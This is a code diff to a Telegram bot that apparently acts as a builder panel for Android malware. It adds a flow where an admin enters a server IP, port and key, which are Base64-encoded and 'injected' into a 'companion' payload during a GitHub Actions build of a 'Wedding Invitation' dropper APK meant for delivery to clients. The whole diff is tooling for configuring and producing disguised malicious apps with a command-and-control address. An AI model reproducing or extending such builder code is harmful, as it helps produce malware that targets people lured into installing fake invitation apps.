@@ -703,6 +703,7 @@ add_client_buf   = {}   # { chat_id: { "field": ..., "data": {} } }
 edit_client_buf  = {}   # { chat_id: { "field": str, "client_id": int } }
 custom_build_buf  = {}   # { chat_id: { "step": "name"|"icon", "client_id": int, "app_name": str, "icon_file_id": str } }
 server_config_buf = {}   # { chat_id: { "step": "ip"|"port"|"key", "client_id": int, "template": str, "ip": str, "port": str, "key": str } }
+dev_test_config_buf = {}  # { chat_id: { "step": "ip"|"port"|"key"|"done", "build_type": str, "ip": str, "port": str, "key": str } }
 
 # ── Session file (Layer 2 + 5) ────────────────────────────────────────────────
 SESSION_FILE     = os.path.join(
@@ -1878,6 +1879,53 @@ def kb_server_config_cancel(client_id: int,
     return kb
 
 
+def kb_dev_test_config_cancel() -> types.InlineKeyboardMarkup:
+    """Cancel button for dev test server config — goes back to test build screen."""
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        types.InlineKeyboardButton("🔙 Back", callback_data="prod_test_build"),
+        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
+    )
+    return kb
+
+
+def kb_dev_test_confirm() -> types.InlineKeyboardMarkup:
+    """Confirm screen keyboard for dev test build."""
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton(
+        "✅ Confirm & Build", callback_data="dev_test_confirm_build"))
+    kb.add(
+        types.InlineKeyboardButton("🔙 Back", callback_data="prod_test_build"),
+        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
+    )
+    return kb
+
+
+def text_dev_test_ip_prompt(cfg: dict = None) -> str:
+    """Dev test build: show current companion values + ask for new IP."""
+    if cfg is None:
+        cfg = read_companion_server_config()
+    if cfg["ip"] or cfg["port"] or cfg["key"]:
+        current_line = (
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "📌 <b>Current in companion:</b>\n"
+            f"   📡 IP   : <code>{cfg['ip']   or '—'}</code>\n"
+            f"   🔌 Port : <code>{cfg['port'] or '—'}</code>\n"
+            f"   🔑 Key  : <code>{cfg['key']  or '—'}</code>\n"
+        )
+    else:
+        current_line = ""
+    return (
+        "🌐 <b>Server Config — Dev Test Build</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "💍 Wedding Invitation\n"
+        + current_line +
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "📡 Enter new server IP:\n\n"
+        "<i>Example: 192.168.1.100</i>"
+    )
+
+
 def text_builds_history(builds: list, client_name: str) -> str:
     lines = [
         f"📋 <b>Builds History — {client_name}</b>",
@@ -2607,9 +2655,13 @@ def prod_next_version() -> str:
 
 def prod_trigger_dev_build(chat_id: int, msg_id: int,
                            template: str = "wedding",
-                           build_type: str = "full") -> bool:
+                           build_type: str = "full",
+                           server_host_b64: str = "",
+                           server_port_b64: str = "",
+                           server_key_b64:  str = "") -> bool:
     """Trigger build_dev.yml on dev branch (test build — no client delivery).
     build_type: 'full' = dropper+companion, 'companion_only' = payload APK only.
+    server_host_b64/server_port_b64/server_key_b64: Base64-encoded server config.
     """
     url = (f"{GH_REPO()}/actions/workflows/build_dev.yml/dispatches")
     payload = {
@@ -2619,6 +2671,9 @@ def prod_trigger_dev_build(chat_id: int, msg_id: int,
             "build_chat_id":    str(chat_id),
             "build_message_id": str(msg_id),
             "build_type":       build_type,
+            "server_host_b64":  server_host_b64,
+            "server_port_b64":  server_port_b64,
+            "server_key_b64":   server_key_b64,
         }
     }
     try:
@@ -3387,6 +3442,152 @@ def handle_server_config_key(message):
                       srv_ip=_new_ip, srv_port=_new_port,
                       srv_key=_new_key),
                   kb_build_confirm(client_id, template))
+
+
+# ── Dev Test Build server config: IP → Port → Key ────────────────────────────
+@bot.message_handler(
+    func=lambda m: (
+        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "ip"
+        and m.text is not None
+    ))
+def handle_dev_test_config_ip(message):
+    chat_id = str(message.chat.id)
+    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
+        return
+    buf    = dev_test_config_buf.get(chat_id)
+    msg_id = nav_state.get(chat_id, {}).get("message_id")
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+    ip = message.text.strip()
+    if not ip:
+        safe_edit(message.chat.id, msg_id,
+                  text_dev_test_ip_prompt(buf.get("_cfg")),
+                  kb_dev_test_config_cancel())
+        return
+    _cfg = buf.get("_cfg")
+    buf["ip"]   = ip
+    buf["step"] = "port"
+    dev_test_config_buf[chat_id] = buf
+    current_hint = (f"<i>Current: <code>{_cfg['port']}</code></i>\n\n"
+                    if _cfg and _cfg.get("port") else "")
+    safe_edit(message.chat.id, msg_id,
+              "🌐 <b>Server Config — Dev Test Build</b>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              f"📡 IP   : <code>{ip}</code>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              "🔌 Enter server port:\n\n"
+              + current_hint +
+              "<i>Example: 7771</i>",
+              kb_dev_test_config_cancel())
+
+
+@bot.message_handler(
+    func=lambda m: (
+        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "port"
+        and m.text is not None
+    ))
+def handle_dev_test_config_port(message):
+    chat_id = str(message.chat.id)
+    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
+        return
+    buf    = dev_test_config_buf.get(chat_id)
+    msg_id = nav_state.get(chat_id, {}).get("message_id")
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+    _cfg = buf.get("_cfg")
+    port = message.text.strip()
+    if not port:
+        current_hint = (f"<i>Current: <code>{_cfg['port']}</code></i>\n\n"
+                        if _cfg and _cfg.get("port") else "")
+        safe_edit(message.chat.id, msg_id,
+                  "🌐 <b>Server Config — Dev Test Build</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  f"📡 IP   : <code>{buf['ip']}</code>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "🔌 Enter server port:\n\n"
+                  + current_hint +
+                  "<i>Example: 7771</i>",
+                  kb_dev_test_config_cancel())
+        return
+    buf["port"] = port
+    buf["step"] = "key"
+    dev_test_config_buf[chat_id] = buf
+    current_hint = (f"<i>Current: <code>{_cfg['key']}</code></i>\n\n"
+                    if _cfg and _cfg.get("key") else "")
+    safe_edit(message.chat.id, msg_id,
+              "🌐 <b>Server Config — Dev Test Build</b>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              f"📡 IP   : <code>{buf['ip']}</code>\n"
+              f"🔌 Port : <code>{port}</code>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              "🔑 Enter connection key:\n\n"
+              + current_hint +
+              "<i>Example: MySecretKey123</i>",
+              kb_dev_test_config_cancel())
+
+
+@bot.message_handler(
+    func=lambda m: (
+        dev_test_config_buf.get(str(m.chat.id), {}).get("step") == "key"
+        and m.text is not None
+    ))
+def handle_dev_test_config_key(message):
+    chat_id = str(message.chat.id)
+    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
+        return
+    buf    = dev_test_config_buf.get(chat_id)
+    msg_id = nav_state.get(chat_id, {}).get("message_id")
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+    _cfg = buf.get("_cfg")
+    key = message.text.strip()
+    if not key:
+        current_hint = (f"<i>Current: <code>{_cfg['key']}</code></i>\n\n"
+                        if _cfg and _cfg.get("key") else "")
+        safe_edit(message.chat.id, msg_id,
+                  "🌐 <b>Server Config — Dev Test Build</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  f"📡 IP   : <code>{buf['ip']}</code>\n"
+                  f"🔌 Port : <code>{buf['port']}</code>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "🔑 Enter connection key:\n\n"
+                  + current_hint +
+                  "<i>Example: MySecretKey123</i>",
+                  kb_dev_test_config_cancel())
+        return
+    buf["key"]  = key
+    buf["step"] = "done"
+    dev_test_config_buf[chat_id] = buf
+    # Build diff block
+    _old_ip   = _cfg["ip"]   if _cfg else "—"
+    _old_port = _cfg["port"] if _cfg else "—"
+    _old_key  = _cfg["key"]  if _cfg else "—"
+
+    def _diff(old, new):
+        if old == new:
+            return f"<code>{new}</code> (unchanged)"
+        return f"<del>{old}</del> → <code>{new}</code>"
+
+    _diff_block = (
+        "🔄 <b>Config Update:</b>\n"
+        f"   📡 IP   : {_diff(_old_ip,   buf['ip'])}\n"
+        f"   🔌 Port : {_diff(_old_port, buf['port'])}\n"
+        f"   🔑 Key  : {_diff(_old_key,  buf['key'])}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+    )
+    safe_edit(message.chat.id, msg_id,
+              _diff_block +
+              "🧪 <b>Dev Test Build — 💍 Wedding Invitation</b>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              "⚠️ No client delivery — admin only.\n\n"
+              "Everything correct?",
+              kb_dev_test_confirm())
 
 
 @bot.message_handler(
@@ -4752,6 +4953,23 @@ def handle_callback(call):
             build_label = "💍 Wedding Invitation"
             apk_note    = "Nova dropper + companion APK (full bundle)"
 
+        # ── Wedding Invitation → ask IP/port/key first ────────────────────────
+        if build_type == "full":
+            _cfg = read_companion_server_config()
+            dev_test_config_buf[str(chat_id)] = {
+                "step":       "ip",
+                "build_type": build_type,
+                "ip":         None,
+                "port":       None,
+                "key":        None,
+                "_cfg":       _cfg,
+            }
+            nav_state[str(chat_id)] = {"screen": "dev_test_config", "message_id": msg_id}
+            safe_edit(chat_id, msg_id,
+                      text_dev_test_ip_prompt(_cfg),
+                      kb_dev_test_config_cancel())
+            return
+
         # ── Step 1: Auto-sync dev ← main ─────────────────────────────────────
         safe_edit(chat_id, msg_id,
                   f"🧪 <b>Test Build — {build_label}</b>\n"
@@ -4821,6 +5039,103 @@ def handle_callback(call):
                           f"📱 APK will arrive here when done.\n"
                           f"No client delivery — admin only.\n\n"
                           f"ℹ️ Cancel not available (run ID fetch failed).",
+                          kb_prod_back())
+        else:
+            safe_edit(chat_id, msg_id,
+                      "❌ <b>Test Build Failed</b>\n"
+                      "━━━━━━━━━━━━━━━━━━━━\n"
+                      "Sync succeeded but GitHub Actions trigger failed.\n"
+                      "Check GITHUB_TOKEN permissions.",
+                      kb_prod_back())
+
+    elif data == "dev_test_confirm_build":
+        # ── Dev test build confirmed — pop buf, encode, sync, trigger ─────────
+        import base64 as _b64dt
+        buf = dev_test_config_buf.pop(str(chat_id), None)
+        if not buf:
+            safe_edit(chat_id, msg_id,
+                      "❌ Session expired. Please start again.",
+                      kb_prod_back())
+            return
+        _ip   = buf.get("ip")   or ""
+        _port = buf.get("port") or ""
+        _key  = buf.get("key")  or ""
+        srv_host_b64 = _b64dt.b64encode(_ip.encode()).decode()   if _ip   else ""
+        srv_port_b64 = _b64dt.b64encode(_port.encode()).decode() if _port else ""
+        srv_key_b64  = _b64dt.b64encode(_key.encode()).decode()  if _key  else ""
+
+        # ── Step 1: Auto-sync dev ← main ─────────────────────────────────────
+        safe_edit(chat_id, msg_id,
+                  "🧪 <b>Dev Test Build — 💍 Wedding Invitation</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "🔃 Step 1/2 — Auto-syncing dev ← main…",
+                  kb_prod_back())
+        sync_ok, sync_result = prod_sync_dev_from_main()
+        if not sync_ok:
+            safe_edit(chat_id, msg_id,
+                      "❌ <b>Test Build Aborted</b>\n"
+                      "━━━━━━━━━━━━━━━━━━━━\n"
+                      f"Auto-sync dev ← main failed:\n{sync_result}\n\n"
+                      "Fix sync issue then try again.",
+                      kb_prod_back())
+            return
+        sync_note = ("✅ dev already in sync with main"
+                     if sync_result == "already-synced"
+                     else f"✅ Synced — merge commit <code>{sync_result}</code>")
+
+        # ── Step 2: Trigger build ─────────────────────────────────────────────
+        safe_edit(chat_id, msg_id,
+                  "🧪 <b>Dev Test Build — 💍 Wedding Invitation</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  f"🔃 Step 1/2 — Sync: {sync_note}\n"
+                  "🏗 Step 2/2 — Triggering build on dev branch…\n"
+                  "🌐 Injecting into companion:\n"
+                  f"IP   : <code>{_ip or '—'}</code>\n"
+                  f"Port : <code>{_port or '—'}</code>\n"
+                  f"Key  : <code>{_key or '—'}</code>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "⏳ Queuing build…",
+                  kb_prod_back())
+        ok = prod_trigger_dev_build(
+            chat_id, msg_id,
+            build_type="full",
+            server_host_b64=srv_host_b64,
+            server_port_b64=srv_port_b64,
+            server_key_b64=srv_key_b64,
+        )
+        if ok:
+            run_id = prod_get_latest_run_id("build_dev.yml", "dev", max_wait=10)
+            if run_id:
+                prod_active_run[str(chat_id)] = run_id
+                safe_edit(chat_id, msg_id,
+                          "🧪 <b>Dev Test Build Triggered</b> ✅\n"
+                          "━━━━━━━━━━━━━━━━━━━━\n"
+                          "📦 Type: 💍 Wedding Invitation\n"
+                          f"🔃 Sync: {sync_note}\n"
+                          "🏗 Build: running on <b>dev</b> branch\n"
+                          f"🆔 Run ID: <code>#{run_id}</code>\n"
+                          "🌐 Injecting into companion:\n"
+                          f"IP   : <code>{_ip or '—'}</code>\n"
+                          f"Port : <code>{_port or '—'}</code>\n"
+                          f"Key  : <code>{_key or '—'}</code>\n"
+                          "━━━━━━━━━━━━━━━━━━━━\n"
+                          "📱 APK will arrive here when done.\n"
+                          "No client delivery — admin only.",
+                          kb_prod_cancel_build())
+            else:
+                safe_edit(chat_id, msg_id,
+                          "🧪 <b>Dev Test Build Triggered</b> ✅\n"
+                          "━━━━━━━━━━━━━━━━━━━━\n"
+                          "📦 Type: 💍 Wedding Invitation\n"
+                          f"🔃 Sync: {sync_note}\n"
+                          "🏗 Build: running on <b>dev</b> branch\n"
+                          "🌐 Injecting into companion:\n"
+                          f"IP   : <code>{_ip or '—'}</code>\n"
+                          f"Port : <code>{_port or '—'}</code>\n"
+                          f"Key  : <code>{_key or '—'}</code>\n"
+                          "━━━━━━━━━━━━━━━━━━━━\n"
+                          "📱 APK will arrive here when done.\n"
+                          "No client delivery — admin only.",
                           kb_prod_back())
         else:
             safe_edit(chat_id, msg_id,
